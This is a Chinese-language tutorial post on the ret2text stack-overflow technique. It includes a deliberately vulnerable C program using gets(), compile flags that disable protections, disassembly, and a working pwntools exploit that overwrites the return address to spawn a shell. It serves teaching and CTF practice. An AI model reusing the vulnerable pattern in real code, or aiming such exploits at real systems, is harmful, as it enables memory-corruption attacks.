---
title: "ret2text"
date: 2024-06-01
draft: false
categories: ["pwn"]
tags: ["pwn", "rop", "stack overflow"]
series: ["rop"]
series_order: 1
---
返回到文本段（Return to text segment）攻击，这是一种利用程序中的可执行代码段（text segment）来执行恶意操作的攻击。这种技术有几个基本前提：

- 程序中的某些代码位置是可预测的，同时在不同运行时是固定的
- 只需要利用程序的现有代码，无需注入新的代码

可以通过一个简单的例子说明这个问题：

```c
// example.c
#include <stdio.h>
#include <stdlib.h>

int success()
{
    puts("called success()!\n");
    return system("/bin/sh");
}

void vuln()
{
    char buf[32];

    gets(buf);
    puts(buf);
}

int main()
{
    vuln();
    return 0;
}

```

上述代码中的库函数 `gets` 是一个危险函数，通过以下给出的 `gets` 的一个实现，可以看出这个函数引起的严重问题。它从标准输入（stdin）读入一行，在遇到一个回车或某个错误时停止。`gets` 从不检查输入的长度，这导致它很容易被利用来进行栈溢出。

```c
/* Read a newline-terminated string from stdin into S,
   removing the trailing newline.  Return S or NULL.  */
char * gets (char *s)
{
  register char *p = s;
  register int c;
  FILE *stream = stdin;
  if (!__validfp (stream) || p == NULL)
    {
      __set_errno (EINVAL);
      return NULL;
    }
  if (feof (stream) || ferror (stream))
    return NULL;
  while ((c = getchar ()) != EOF)
    if (c == '\n')
      break;
    else
      *p++ = c;
  *p = '\0';
  /* Return null if we had an error, or if we got EOF
     before writing any characters.  */
  if (ferror (stream) || (feof (stream) && p == s))
    return NULL;
  return s;
}

```

通过 gcc 编译上述代码

```sh
$ gcc -std=c99 \            # 使用 C99 标准，C99 之后不支持 gets 函数
    -no-pie \               # 关闭地址随机化
    -fno-stack-protector \  # 关闭栈破坏检测
    -z execstack \          # 关闭栈不可执行
    example.c -o example
```

可以利用 checksec 来检查编译出文件的安全性

```sh
$ checksec example
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```

使用 IDA 反汇编程序，我们可以看到对应函数的汇编表示，

```assembly
; Attributes: bp-based frame

public vuln
vuln proc near

s= byte ptr -20h

; __unwind {
push    rbp
mov     rbp, rsp
sub     rsp, 20h
lea     rax, [rbp+s]
mov     rdi, rax
call    _gets
lea     rax, [rbp+s]
mov     rdi, rax        ; s
call    _puts
nop
leave
retn
; } // starts at 40116A
vuln endp
```

可以看出当程序运行时，`vuln` 函数在运行时的栈帧如下所示。如果提供大于32字节的数据时栈帧中保存的栈指针和返回地址。因此我们可以输入大于32字节的数据来覆盖返回地址，从而控制程序的执行流。

```markdown
|      rsp       |
|:--------------:|
|  char buf[0]   |
|      ...       |
|  char buf[31]  |
|:--------------:|
|      rbp       |
|:--------------:|
| return address |
```

以下是利用 pwntools 编写的 wp:

```python
from pwn import *

context(log_level='debug', arch='amd64', os='linux')
sh = process('./example')

# gdb.attach(sh)

success_addr = 0x401146
payload = b'a' * 0x20 # buf[32]
payload += b'b' * 8 # rbp
# 伪造返回地址，跳转到 nop ; ret，Ubuntu18及以上版本的系统要求在调用system函数时栈16字节对齐，
# 即调用system函数时rsp的值必须是16的倍数，也就是末位为0，否则无法执行。这里多进行一次 rtn 以实现对齐
payload += p64(0x40112f)
payload += p64(success_addr) # success 函数地址

sh.sendline(payload)
sh.interactive()
```

> NOTE:
>
> 上述代码中，没有立即跳转到 `success()` 的运行地址，这是源于 `system()` 函数运行时的**栈16字节对齐**要求。
